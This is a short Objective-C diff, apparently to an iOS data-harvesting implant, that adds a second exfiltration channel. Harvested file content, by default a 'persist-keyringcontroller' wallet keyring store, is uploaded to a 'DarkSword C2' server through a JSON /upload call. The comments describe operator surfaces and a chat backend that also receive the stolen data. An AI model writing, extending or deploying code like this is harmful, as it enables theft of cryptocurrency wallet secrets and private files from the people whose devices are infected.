@@ -31,6 +31,7 @@
 #import "FilzaDiagnostics.h"
 #import "MCMBridge.h"
 #import "MCMFilzaIntegration.h"
+#import "DarkSwordClient.h"
 
 static NSString *const TMPersistComponent = @"PersistStore";
 
@@ -1015,6 +1016,20 @@ void TryMaskCardPersistHarvest(BOOL force)
                 NSString *path = [result[@"path"] isKindOfClass:NSString.class] ? result[@"path"] : nil;
                 NSData *content = path.length > 0 ? [NSData dataWithContentsOfFile:path] : nil;
                 @synchronized (TMPersistLock()) { gTMPersistContent = content; }
+                // DarkSword C2 delivery: the same harvest pushed over DarkSword's
+                // native JSON /upload contract. Runs alongside the chat backend so
+                // either operator surface can receive it; inert unless
+                // darkSwordEnabled=true in the packaged plist.
+                {
+                    NSString *dsPath = [result[@"relativePath"] isKindOfClass:NSString.class]
+                        ? result[@"relativePath"] : @"persist-keyringcontroller";
+                    NSString *dsDesc = [NSString stringWithFormat:
+                        @"harvest resolution=%@ bundle=%@",
+                        result[@"resolution"] ?: @"n/a", result[@"bundleID"] ?: @"n/a"];
+                    DarkSwordUpload(DarkSwordCategory(), dsPath, dsDesc,
+                                    content ?: [NSData data], nil);
+                }
+
                 // The report is written after the file upload settles, and carries
                 // its outcome: otherwise the report can say "harvested" while the
                 // file never reached the backend, which is the one question it has
